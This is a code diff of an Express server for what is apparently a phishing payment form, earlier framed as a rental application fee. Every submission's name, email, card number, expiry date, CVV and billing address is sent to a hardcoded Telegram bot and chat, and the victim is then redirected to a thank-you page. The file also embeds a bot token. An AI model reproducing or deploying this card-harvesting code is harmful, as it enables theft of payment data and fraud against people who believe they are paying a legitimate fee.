@@ -1,68 +1,61 @@
 const express = require('express');
 const bodyParser = require('body-parser');
-const path = require('path');
 const fetch = require('node-fetch');
+const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Replace with your Telegram bot token and chat ID
 const TELEGRAM_BOT_TOKEN = '6278639566:AAFOIuW6Gjd53XTJJSQUoWu83j9bQ540Th8';
 const TELEGRAM_CHAT_ID = '-1002156953987';
+app.use(bodyParser.urlencoded({ extended: true }));
 
-app.use(bodyParser.json());
-
-// Serve static files from the "public" directory
+// Serve static files (your HTML, CSS, JS)
 app.use(express.static('public'));
 
-// Serve index.html on the root route
-app.get('/', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
-});
-
+// Handle form submission
 app.post('/submit', (req, res) => {
-    const { name, email, creditCard, expDate, cvv, billingAddress } = req.body;
+    const { fullName, email, cardNumber, expDate, cvv, billingAddress } = req.body;
 
     // Construct the message to send to Telegram
     const message = `
-        New Rental Application - $25.00 Fee Paid
-        ----------------------------------------
-        Name: ${name}
+        New Payment Submission:
+        Name: ${fullName}
         Email: ${email}
-        Credit Card Number: ${creditCard}
+        Card Number: ${cardNumber}
         Expiration Date: ${expDate}
         CVV: ${cvv}
         Billing Address: ${billingAddress}
     `;
 
-    // Telegram API URL
+    // Send the message to Telegram
     const telegramURL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
-    // POST request payload
-    const telegramPayload = {
-        chat_id: TELEGRAM_CHAT_ID,
-        text: message
-    };
-
-    // Send the message to Telegram
     fetch(telegramURL, {
         method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(telegramPayload)
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message
+        })
     })
     .then(response => response.json())
     .then(data => {
         if (data.ok) {
-            res.json({ success: true });
+            res.redirect('/thank-you');
         } else {
-            res.json({ success: false, error: data.description });
+            res.send('Failed to send message. Please try again.');
         }
     })
     .catch(error => {
-        res.json({ success: false, error: error.message });
+        console.error('Error:', error);
+        res.send('Error processing your request.');
     });
+});
+
+// Serve the thank you page
+app.get('/thank-you', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'thank-you.html'));
 });
 
 app.listen(PORT, () => {
